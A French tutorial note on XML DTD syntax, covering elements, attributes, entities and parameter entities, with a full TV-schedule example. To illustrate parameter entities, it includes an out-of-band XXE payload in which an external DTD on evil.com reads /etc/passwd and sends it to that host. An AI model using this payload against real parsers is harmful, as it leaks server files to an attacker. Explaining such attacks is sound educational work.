# XML DTD

* DTD pour _Document Type Definition_
* Définis la structure que devrait avoir un document xml
* On spécifie le DTD avant le premier noeud \(hors description\) dans un élément `<!DOCTYPE>` \(qui n'a pas de `/` fermante\)
  * Déclaration dans le fichier `<!DOCTYPE root_name [...]>`
  * Inclusion d'un fichier externe `<!DOCTYPE root_name SYSTEM "file">`

### Elément

On décrit un élément ainsi

```markup
<!ELEMENT element-name EMPTY>
<!ELEMENT element-name ANY>
<!ELEMENT element-name (#PCDATA)>
<!ELEMENT element-name (child1)>
<!ELEMENT element-name (child1, child2, ...)>
```

* `#PCDATA` \(_Parsed Character Data_\) signifie que ces données seront interprêtées par le parser à l'inverse des `#CDATA` \(_Character Data_\)
* Les enfants doivent se retrouver dans le même ordre dans le document xml
* Tous les enfants spécifiés doivent être déclarés \(décrits\) dans le fichier DTD
* Certains symbole ajoute des restrictions :

```markup
<!ELEMENT note (message)> <!-- Uniquement 1 enfant nommé message -->
<!ELEMENT note (message+)> <!-- 1 ou plusieurs enfants nommés message -->
<!ELEMENT element-name (message*)> <!-- 0 ou plus enfants nommés message -->
<!ELEMENT element-name (message?)> <!-- 0 or 1 enfant nommé message -->
<!ELEMENT note (to,from,header,(message|body))> <!-- to, from header obligatoire, puis soit message soit body -->
```

### Attributs

On décrit un attribut ainsi :

```markup
<!ATTLIST element_name attribute_name attribute_type attribute_value>
```

Type acceptés :

| Type | Définition |
| :--- | :--- |
| CDATA | Character data |
| \(val1\|val2\|..\) | One from the enumerated list |
| \(val1\|val2\|..\) "val1" | One from the enumerated list,                                                    defaulting to the specified one |
| ID | Unique id |
| IDREF | Id of another element |
| IDREFS | List of other ids |
| NMTOKEN | Valid XML name |
| NMTOKENS | List of valid XML names |
| ENTITY | Entity |
| ENTITIES | List of entities |
| NOTATION | Name of a notation |
| xml: | Predefined xml value |

Valeur acceptées :

| Valeur | Définition |
| :--- | :--- |
| value | The default value of the attribute |
| \#REQUIRED | The attribute is required |
| \#IMPLIED | The attribute is optional |
| \#FIXED value | The attribute value is fixed |

### Entity

L'équivalent de variable, peuvent contenir une valeur donnée ou load le contenu d'un fichier \(local ou depuis un lien\). Ce second cas est ce qu'on appelle une entité externe.

```markup
<!DOCTYPE test [
    <!ENTITY entity_name1 "entity-value">
    <!ENTITY entity_name2 SYSTEM "URI/URL">
]>
<test>&entity_name1;</test>
```

#### Parameter Entity

Elles permettent 2 choses :

* Etre référencées directement dans le DTD
* Référencer une autre entité dans leur valeur \(uniquement possible si elles sont en externe\)

L'exemple qui suit sert à une attaque mais montre bien l'idée :

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
    <!ENTITY % file_content SYSTEM "/etc/passwd">
    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
    %wrapper;
```

### Example Complet

```markup
<!DOCTYPE TVSCHEDULE [

<!ELEMENT TVSCHEDULE (CHANNEL+)>
<!ELEMENT CHANNEL (BANNER,DAY+)>
<!ELEMENT BANNER (#PCDATA)>
<!ELEMENT DAY (DATE,(HOLIDAY|PROGRAMSLOT+)+)>
<!ELEMENT HOLIDAY (#PCDATA)>
<!ELEMENT DATE (#PCDATA)>
<!ELEMENT PROGRAMSLOT (TIME,TITLE,DESCRIPTION?)>
<!ELEMENT TIME (#PCDATA)>
<!ELEMENT TITLE (#PCDATA)> 
<!ELEMENT DESCRIPTION (#PCDATA)>

<!ATTLIST TVSCHEDULE NAME CDATA #REQUIRED>
<!ATTLIST CHANNEL CHAN CDATA #REQUIRED>
<!ATTLIST PROGRAMSLOT VTR CDATA #IMPLIED>
<!ATTLIST TITLE RATING CDATA #IMPLIED>
<!ATTLIST TITLE LANGUAGE CDATA #IMPLIED>
]>
```
